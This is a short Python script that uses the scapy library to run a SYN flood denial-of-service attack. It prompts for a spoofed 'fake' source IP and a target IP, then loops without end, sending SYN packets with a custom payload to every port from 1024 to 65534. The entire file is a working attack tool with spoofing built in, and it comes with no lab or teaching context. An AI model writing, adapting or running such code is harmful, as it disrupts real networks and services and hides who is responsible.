#!/usr/bin/python

from scapy.all import *

#synflood with message to span every port
def synFlood(src, tgt, message):
	for dport  in range(1024,65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=dport)
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)
		print("Packet sent to: " + str(tgt) + " over port " + str(dport)) 
def main():
	source= raw_input("Enter the fake IP address you want to use: ")
	target = raw_input("Enter the Target IP address: " )
	message = raw_input("Enter the message: ") 
	while True:
		synFlood(source,target,message)

main()
